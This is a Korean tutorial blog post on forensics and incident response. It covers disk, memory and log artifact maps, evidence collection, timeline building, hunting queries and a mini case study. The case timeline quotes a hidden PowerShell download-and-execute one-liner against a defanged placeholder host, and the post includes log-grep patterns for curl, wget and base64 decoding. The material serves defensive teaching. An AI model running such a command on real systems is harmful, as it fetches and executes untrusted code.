---
layout: post
title: 시스템보안 - 포렌식 & 사고 대응
date: 2025-10-26 21:30:23 +0900
category: 시스템보안
---
# 11. 포렌식 & 사고 대응(IR)

## 11.1 디스크/메모리/로그 아티팩트 맵

### 11.1.1 DFIR 큰 그림 (수집 → 보존 → 분석 → 보고)
- **수집(Collection)**: 증거 식별, 스냅샷/이미지/덤프 취득, 해시  
- **보존(Preservation)**: 무결성(해시), 체인 오브 커스터디(CoC) 기록  
- **분석(Analysis)**: 타임라인, 유입 경로, 지속성, 내·외부 통신, 데이터 유출 여부  
- **보고(Reporting)**: 사실관계, 영향 범위, 개선 권고, 재발 방지안

**체인 오브 커스터디 템플릿(예시)**  
```
[CoC Record]
Evidence ID: WS-2025-11-01-001
Collected By: Kim, IR Team
Date/Time (KST): 2025-11-01 21:10
Location: HQ-WS-12F
Description: Windows 11 Workstation NVMe 1TB, BitLocker On (recovered key), RAM 32GB
Action Log:
  - 21:10: FTK Imager로 E01 생성 (MD5/SHA256 해시 산출)
  - 22:00: WinPmem으로 RAW 메모리 덤프 획득
  - 22:15: 증거 봉인백 #SEAL-3392 보관, 금고 랙 A-12
Signatures: Collector / Witness / Custodian
```

---

### 11.1.2 디스크 아티팩트 지도 (Windows / Linux / macOS)

#### A) Windows (10/11, Server 2019+)
- **파일시스템**: NTFS $MFT, $LogFile, $UsnJrnl, $Recycle.Bin, Volume Shadow Copies(VSS)  
- **사용자 활동**  
  - `C:\Users\<user>\AppData\Local\Microsoft\Windows\Recent\` (Jump Lists: `AutomaticDestinations`)  
  - `ShellBags`(폴더 보기 기록), `LNK`(바로가기)  
  - `Browser`(Edge/Chrome/Firefox): History SQLite, Cookies, Cache  
- **레지스트리**  
  - `NTUSER.DAT`(사용자), `USRCLASS.DAT`(Shell)  
  - 시스템 하이브: `SYSTEM`, `SOFTWARE`, `SECURITY`, `SAM`  
  - Run 키, Services, ShimCache(AppCompatCache), Amcache  
- **로그**  
  - Windows Event Logs: `Security`, `System`, `Application`, `Microsoft-*` 채널  
  - PowerShell (`Microsoft-Windows-PowerShell/Operational`)  
  - Sysmon (`Microsoft-Windows-Sysmon/Operational`)  
- **네트워크**  
  - DNS Client Events (`Microsoft-Windows-DNS-Client/Operational`)  
  - RDP/Logon 이벤트(Security 4624/4625/4778/4779 등)

**빠른 스냅샷 수집(읽기 전용 PowerShell)**  
```powershell
# 1) 기본 시스템 정보 + 네트워크 세션
Get-ComputerInfo | Select-Object OsName,OsVersion,OsBuildNumber,WindowsInstallDateFromRegistry
Get-NetTCPConnection | Group-Object State, OwningProcess | Sort-Object Count -Descending | Select -First 10
Get-Process | Sort-Object CPU -Descending | Select -First 15 Id, ProcessName, StartTime

# 2) 최근 실행 흔적(ShimCache/Amcache는 전문 도구 권장), 이벤트 개수 요약
$since=(Get-Date).AddDays(-2)
Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$since} | Group-Object Id | Sort Count -desc | Select -First 10
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; StartTime=$since} | Measure-Object
```

#### B) Linux
- **파일시스템/메타**: ext4 journal, inodes, atime/mtime/ctime  
- **로그**: `/var/log/auth.log`, `secure`, `messages`, `syslog`, `journalctl`  
- **사용자 활동**: `~/.bash_history`, `~/.ssh/authorized_keys`, `last`, `wtmp`, `btmp`  
- **서비스/크론**: `/etc/systemd/system/*.service`, `/etc/cron*`, `user crontab`  
- **네트워크**: `ss -tulpen`, `iptables`/`nft`, `resolv.conf`

**기초 트리아지(Bash)**  
```bash
# 1) 로그인/인증 흔적
last -a | head
journalctl --since "2 days ago" -u ssh --no-pager | tail -n 100

# 2) 네트워크 리스닝/외부 세션
ss -tulpen
ss -tp | awk '/ESTAB/{print $0}' | head

# 3) 최근 수정 상위 N개
find / -xdev -type f -mtime -2 2>/dev/null | head -n 50
```

#### C) macOS
- **로그**: Unified Log (`log show --predicate ...`), `/var/log` 일부  
- **사용자 데이터**: Safari DB, Spotlight, QuarantineEvents, LaunchAgents/Daemons  
- **지속성**: `~/Library/LaunchAgents`, `/Library/LaunchDaemons`, LoginItems

**샘플**  
```bash
# 최근 48시간 핵심 보안/네트워크 로그
log show --last 48h --predicate 'category CONTAINS "network" || subsystem CONTAINS "security"' --style syslog | tail -n 200
```

---

### 11.1.3 메모리 아티팩트 지도 (Windows 중심, Linux 병행)
- **프로세스/스레드 테이블**, **핸들 테이블**, **네트워크 소켓**  
- **크리덴셜/토큰**(보호 조치에 따라 노출 제한), **LSASS/SSP** 구조(합법 분석 시 샌드박스/비식별)  
- **모듈/맵핑**(코드 인젝션/Reflective Load 힌트), **APC/Hook** 흔적  
- **EDR/보안 에이전트** 모듈 상태(중지/비활성 흔적)

**Volatility 3 예시(합법 덤프에서 읽기 전용 분석)**  
```bash
# 프로세스 목록/트리
vol -f mem.raw windows.pslist
vol -f mem.raw windows.pstree

# 네트워크(지원 이미지/심볼 필요)
vol -f mem.raw windows.netstat

# 이미지 로드(주입 힌트)
vol -f mem.raw windows.malfind
vol -f mem.raw windows.dlllist --pid 1234
```

> 실무 팁: 메모리→디스크 교차 검증(메모리의 모듈/경로 vs 디스크 실제 파일/해시).

---

### 11.1.4 로그 채널 & 이벤트 맵 (Windows 요약)
- **Security**  
  - 4624(로그온), 4625(실패), 4672(권한 있는 로그온), 4688(프로세스 생성)  
  - 4776(NTLM), 4768/4769(Kerberos), 4670(권한 변경)  
- **PowerShell/Operational**  
  - 4103(Module logging), 4104(ScriptBlock)  
- **Sysmon/Operational**  
  - 1(ProcCreate), 3(NetworkConnect), 7(ImageLoad), 10(ProcessAccess), 11(FileCreate), 12~14(Registry), 22(DNS)  
- **Microsoft-Windows-PrintService/Operational** (프린트/스풀러)  
- **Microsoft-Windows-DNS-Client/Operational** (클라이언트 DNS)  
- **Defender/Operational**, **CodeIntegrity/Operational**

**KQL 예시 — 지난 6시간 의심 ProcessAccess(주입 체인 힌트)**  
```kusto
Sysmon
| where EventID == 10 and TimeGenerated > ago(6h)
| where CallTrace has_any ("WriteProcessMemory","VirtualAllocEx","CreateRemoteThread")
| summarize cnt=count() by TargetImage, SourceImage, User, bin(TimeGenerated, 15m)
| order by cnt desc
```

---

### 11.1.5 툴킷 & 워크플로 (랩 기준)
- **수집**: FTK Imager/KAPE, `dd`/Guymager, WinPmem/AVML(리눅스), DumpIt  
- **분석**: Volatility 3, Eric Zimmerman 도구들(LECmd, MFTECmd, AmcacheParser, EvtxECmd), Plaso/Timesketch  
- **네트워크**: Zeek, Wireshark/TShark, Brim/Zui(Suricata/Zeek 로그 탐색)  
- **자동화**: Velociraptor(수집/쿼리/라이브), Kolide/Fleet(Osquery)

**KAPE 예시(USB 외장으로 빠른 triage)**  
```bash
# (Admin PowerShell) 대상 디스크에서 triage 아티팩트 수집
.\kape.exe --tsource C: --tdest E:\KAPE_OUT --tflush --target !SANS_Triage
# 산출물 해시 계산(예시)
Get-ChildItem E:\KAPE_OUT -Recurse | Get-FileHash -Algorithm SHA256 | Out-File E:\KAPE_OUT\hashes.txt
```

---

## 11.2 타임라인/유입 경로 분석, 휘발성 데이터 수집(메모리 덤프)

### 11.2.1 타임라인(슈퍼 타임라인) — Plaso(Log2Timeline) → Timesketch

**개념**  
- 서로 다른 출처(파일메타, 레지스트리, 로그, 브라우저, Prefetch, $MFT, $USN 등)를 하나의 시간축으로 병합 → **행위 상관**이 쉬워짐.

**Plaso 구축(예시, Linux 분석 워크스테이션)**  
```bash
# 1) 증거 마운트(읽기 전용)
sudo mkdir -p /mnt/evidence
sudo mount -o ro,loop,show_sys_files,streams_interface=windows evidence.E01 /mnt/evidence

# 2) 슈퍼 타임라인 생성 (수 시간 걸릴 수 있음, 랩은 샘플로)
log2timeline.py --hashers sha256 --status_view linear /cases/ws1.plaso /mnt/evidence

# 3) 빠른 필터 내보내기
psort.py -o L2tcsv -w /cases/ws1_timeline.csv /cases/ws1.plaso
```

**타임라인 첫 시각화(스프레드시트/파이썬)**  
```python
# (로컬 분석용) 타임라인 CSV에서 의심 확장자/도구 흔적 필터
import pandas as pd
df = pd.read_csv('/cases/ws1_timeline.csv', low_memory=False)
sus = df[df['message'].str.contains('powershell|wevtutil|bitsadmin|rundll32', case=False, na=False)]
sus[['datetime','timestamp_desc','source','message']].head(20)
```

**Timesketch 업로드(있을 경우)**  
- 팀 협업, 주석/태깅, 시각적 스토리 빌딩 → 유입 경로·확산 경로를 **내러티브로** 정리.

---

### 11.2.2 유입 경로(Initial Access) 분석 프레임

**공통 벡터 체크리스트**
- 이메일 첨부/링크 → 브라우저 히스토리/다운로드/이메일 게이트웨이 로그  
- 원격 서비스(RDP/SSH/VPN) → 비정상 로그인·지리·시간대, MFA 실패  
- 소프트웨어 공급망/업데이트 채널 → 서명, 해시 이력  
- 외부 노출 포트/웹 앱 → WAF/Reverse Proxy/웹서버 로그와 이벤트 상관  
- 이동식 매체(USB) → 최근 연결 기록, 드라이버 설치 로그

**Windows KQL — 의심 PowerShell 실행 + 다운로드 흔적 상관**
```kusto
let t1 = SecurityEvent
| where EventID == 4688 and Process has "powershell"
| project TimeGenerated, Computer, Account, CommandLine;
let t2 = Sysmon
| where EventID == 3 and DestinationPort in (80,443)
| summarize by bin(TimeGenerated, 1m), Computer, DestinationIp, Image;
t1
| join kind=inner (t2) on Computer, $left.TimeGenerated == $right.TimeGenerated
| project TimeGenerated, Computer, Account, CommandLine, DestinationIp
```

**Linux — 유입 순간 주변 로그 묶음(Bash)**  
```bash
# 의심 시간창(예: 2025-11-01 18:00 ~ 19:00 KST)
journalctl --since "2025-11-01 18:00" --until "2025-11-01 19:00" -u ssh --no-pager
grep -E "wget|curl|bash -c|base64 -d" /var/log/* -R | tail -n 50
last -a | head
```

---

### 11.2.3 휘발성 데이터 수집(메모리 덤프) — 안전한 절차

> 목적: 실행 중 프로세스/네트워크/핸들/모듈 상태를 보존.  
> 원칙: **중단 최소화**, **해시 기록**, **저장 매체 암호화**, **민감정보 마스킹 정책** 준수.

#### Windows
- **WinPmem**(RAW/aff4), **DumpIt**(원클릭), **NotMyFault**(Crash dump — 서비스 영향 큼, 신중)  
- **BitLocker 활성** 시: 키 백업/해제 후 디스크 캡처, 메모리 덤프는 가능

**WinPmem 예시(관리자 PowerShell)**  
```powershell
# 1) 도구 검증(서명/해시)
Get-FileHash .\winpmem.exe -Algorithm SHA256

# 2) RAW 덤프 (대용량, 경로는 외장 USB)
.\winpmem.exe --format raw --output E:\dumps\WS-001_2025-11-01.raw

# 3) 해시 기록
Get-FileHash E:\dumps\WS-001_2025-11-01.raw -Algorithm SHA256 | Out-File E:\dumps\hash.txt
```

#### Linux
- **AVML**(Azure 메모리 포렌식 도구), **LiME**(커널 모듈; 운영 영향 고려)  
```bash
sudo avml /mnt/usb/lin-2025-11-01.lime
sha256sum /mnt/usb/lin-2025-11-01.lime > /mnt/usb/hash.txt
```

> 주의: 생산 시스템에서는 **덤프 IO로 인한 성능 영향**이 있을 수 있음. 가능한 한 **오프피크** 및 **위험 허용 계획** 하에 수행.

---

### 11.2.4 메모리 분석 워크플로 (Volatility 3)

**1) 베이직 인덱싱**
```bash
vol -f WS-001.raw windows.info
vol -f WS-001.raw windows.pslist
vol -f WS-001.raw windows.netstat
```

**2) 주입/로드 이상 탐색**
```bash
vol -f WS-001.raw windows.malfind --dump
vol -f WS-001.raw windows.dlllist --pid 1234
vol -f WS-001.raw windows.handles --pid 1234 | grep -i "Key|Mutant|Section"
```

**3) 스크립트/PowerShell 흔적(환경에 따라 지원)**
```bash
vol -f WS-001.raw windows.cmdline | grep -i "powershell"
vol -f WS-001.raw windows.getsids --pid 1234
```

**4) 결과 보강**
- 덤프된 섹션/모듈을 **정적 스캔**(AV, YARA)  
- 네트워크 세션을 **Zeek pcap**과 상관(있다면)

---

### 11.2.5 네트워크 타임라인(Zeek/TShark) — 유출·C2 힌트

**Zeek 빠른 파이프라인(이미 수집된 pcap 가정)**
```bash
zeek -C -r suspicious.pcap
# 생성 로그: conn.log, dns.log, http.log, ssl.log 등
cat dns.log | zeek-cut ts query answers | head
cat http.log | zeek-cut ts id.orig_h id.resp_h host uri status_code | head
```

**TShark 예시**
```bash
# 의심 도메인/호스트 필터
tshark -r suspicious.pcap -Y 'http.request or tls.handshake' -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri | head
```

**상관 아이디어**
- 메모리 netstat/소켓 목록 ↔ Zeek `conn.log` IP/포트 매칭  
- 타임라인(Plaso) 내 다운로드 시점 ↔ http.log 요청 URI/파일명 대응

---

### 11.2.6 브라우저/실행 흔적 상관 (Windows)

**Prefetch + LNK + Amcache 결합**
- **Prefetch**: 실행 프로그램 + I/O 참조 흔적 (기본 워크스테이션 활성)  
- **LNK**: 최근 열람 대상 경로/볼륨/타임스탬프  
- **Amcache**: 프로그램 설치/실행 메타, 해시/경로

**Eric Zimmerman 툴 예시(콘솔 호출)**  
```bash
# Prefetch
PECmd.exe -d "C:\Windows\Prefetch" --csv "E:\CASE\PE" --csvf pe.csv

# Amcache
AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" --csv "E:\CASE\AM" --csvf am.csv

# LNK
LECmd.exe -d "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" --csv "E:\CASE\LNK" --csvf lnk.csv
```

**파이썬으로 상관 조각**
```python
import pandas as pd
pe = pd.read_csv('E:/CASE/PE/pe.csv')
am = pd.read_csv('E:/CASE/AM/am.csv')
ln = pd.read_csv('E:/CASE/LNK/lnk.csv')

# 공통 컬럼 키 정규화(예: Executable Path, SHA1 등)
sus_exec = pd.merge(pe, am, how='outer', left_on='Executable', right_on='ProgramName')
sus_exec[['LastRun','Executable','SHA1','Path']].drop_duplicates().head(20)
```

---

### 11.2.7 IR 의사결정: 봉쇄(Containment) ↔ 증거보존 균형

**원칙**
1) **추가 피해 방지**가 우선: C2 차단, 계정 잠금/회전, 네트워크 격리  
2) **증거 보전**: 로그 삭제/증거 변조 방지 — WEF/중앙 SIEM, 스냅샷 즉시  
3) **업무 영향 평가**: 고가용 환경은 단계적 봉쇄(세그먼트 차단 → 개별 노드)

**의사결정 매트릭스(예)**
| 시나리오 | 봉쇄 우선 | 보전 우선 | 행동 |
|---|---|---|---|
| 대량 랜섬 실행 중 | ✅ | △ | 즉시 네트워크 분리, 스냅샷 후 격리 |
| 조용한 C2 비콘 의심 | △ | ✅ | 네트워크 미러링/pcap, 룰로만 차단(격리는 후순위) |
| 데이터 유출 활발 | ✅ | ✅ | egress 차단+메모리 덤프+디스크 이미지 병행 |

---

### 11.2.8 결과 정리 & 보고서 골격

**요약**
- 사건 개요(탐지 시각, 신고자, 영향 범위)  
- 타임라인(핵심 10~20 이벤트)  
- 유입 경로 가설 & 근거  
- 피해/영향(자산/데이터/사용자)  
- 조치(봉쇄/제거/복구), 미조치 리스크  
- 권고(정책/패치/구조) — 우선순위/마감일

**부록**
- 수집 산출물 목록(E01/RAW/pcap/CSV) + 해시(SHA256)  
- 분석 쿼리/룰(Sigma/KQL/Sysmon)  
- 체인 오브 커스터디 서명본

---

## 11.2.x 실전 예제: “의심 PowerShell 다운로드 실행” 미니 케이스

**가정**
- 2025-11-01 17:43 KST: EDR 알림 “PowerShell with Web Download”  
- 자산: WIN11-WKS-07, 사용자 `dhkim`

**즉시 조치**
1) 이벤트/로그 원격 수집: 4688/PowerShell 4104, Sysmon 1/3/11/22  
2) 메모리 덤프 → Volatility로 `powershell.exe` 모듈/명령행 확인  
3) pcap(있다면)에서 해당 시각 HTTP/TLS 요청 추출

**분석 스케치(KQL)**  
```kusto
let win = SecurityEvent
| where EventID == 4688 and Process has "powershell.exe" and TimeGenerated between (datetime(2025-11-01 17:40:00) .. datetime(2025-11-01 17:50:00))
| project TimeGenerated, Computer, Account, CommandLine;

let net = Sysmon
| where EventID == 3 and TimeGenerated between (datetime(2025-11-01 17:40:00) .. datetime(2025-11-01 17:50:00))
| project TimeGenerated, Computer, Image, DestinationIp, DestinationHostname, DestinationPort;

win
| join kind=leftouter (net) on Computer, $left.TimeGenerated == $right.TimeGenerated
| project TimeGenerated, Computer, Account, CommandLine, DestinationHostname, DestinationIp, DestinationPort
```

**Volatility(요약)**
```bash
vol -f WIN11-WKS-07_1748.raw windows.pslist | grep -i powershell
vol -f WIN11-WKS-07_1748.raw windows.cmdline | grep -i powershell
vol -f WIN11-WKS-07_1748.raw windows.dlllist --pid <ps_pid>
```

**타임라인 결론(예)**
- 17:42:58: `powershell.exe -nop -w hidden -c iwr https://hxxp[.]ex/xx | iex`  
- 17:43:01: DNS `hxxp.ex` 조회, 443 연결  
- 17:43:06: 사용자 세션 유지, 추가 프로세스 생성 없음(EDR 차단)  
→ **유입 경로**: 사용자의 이메일 링크 클릭 가능성(메일 게이트웨이 로그 확인 필요)

**권고**
- URL 클릭 방지 교육/게이트웨이 차단 룰 강화  
- PowerShell Constrained Language Mode/ASR 기본값 검토  
- 프록시 TLS 인스펙션 룰, `User-Agent` 시그널 기반 차단 보완

---

## 체크리스트 요약

**수집**
- [ ] 디스크 이미지(E01/RAW), 메모리 덤프, pcap/Zeek  
- [ ] 핵심 이벤트 채널(Security/PowerShell/Sysmon/CodeIntegrity 등)  
- [ ] 브라우저/Prefetch/LNK/Amcache

**보존**
- [ ] SHA256 해시, CoC 문서화  
- [ ] 읽기 전용 마운트/쓰기 차단

**분석**
- [ ] Plaso → 슈퍼 타임라인, Timesketch 협업  
- [ ] Volatility → 프로세스/네트워크/모듈/주입  
- [ ] KQL/Sigma/Sysmon 룰로 상관 · 이상치

**대응**
- [ ] 즉시 봉쇄 범위/방법(격리/차단) 선정  
- [ ] 계정/토큰/비밀 회전, EDR 룰 튜닝  
- [ ] 패치/구성(ASR/WDAC/로그 보전) 개선안

---

# 마무리
- **아티팩트 맵**을 먼저 확보하면, 사건 유형이 달라도 **일관된 경로**(수집→보존→타임라인→유입 경로→보고)로 움직일 수 있습니다.  
- **Plaso/Timesketch + Volatility + SIEM 쿼리**의 3박자는 **행위 상관을 가속**합니다.  
- **봉쇄 vs 증거보존**은 상황별 균형이 핵심이며, 사전 **Runbook**과 **테이블탑 연습**이 결과를 좌우합니다.
